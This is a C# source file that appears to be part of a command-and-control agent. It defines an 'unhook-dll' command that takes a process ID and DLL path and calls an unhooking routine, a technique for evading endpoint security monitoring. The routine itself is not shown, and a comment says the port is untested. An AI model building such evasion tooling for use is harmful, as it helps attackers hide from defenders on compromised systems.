using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;

namespace Agent.Commands
{
    public class UnHookDll : AgentCommand
    {
        // ported without testing with windbg
        public override string Name => "unhook-dll";

        public override string Execute(AgentTask task)
        {
            if (task.Args is null || task.Args.Length == 0)
            {
                return "Error Provide Args <pid> <fullPathToDll>";
            }
            if (!int.TryParse(task.Args[0], out var pid))
                return "Failed to parse PID";
            var fullPathToDll = task.Args[1];
            if (!Internal.Unhooker.UnhookAnyDll(fullPathToDll, pid))
                return $"Failed to unhook {fullPathToDll}";
            return $"Unhooked {fullPathToDll}";

        }
    }
}
